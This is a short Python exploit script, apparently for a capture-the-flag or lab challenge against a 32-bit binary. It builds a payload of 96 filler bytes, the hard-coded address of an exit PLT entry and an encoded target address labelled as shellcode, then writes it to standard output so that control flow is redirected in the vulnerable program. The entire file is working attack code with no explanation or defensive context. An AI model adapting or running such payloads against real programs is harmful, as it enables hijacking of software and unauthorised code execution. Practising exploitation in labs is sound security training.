#!/usr/bin/python3 
import sys
import struct
import subprocess

def p32(x):
    return struct.pack("<I", x)


exit_plt_address = 0x0804a018
shellcode_address = 0x080485e3

payload = b'\x01' * 96
payload += p32(exit_plt_address)
payload += str(int(shellcode_address)).encode()

sys.stdout.buffer.write(payload)
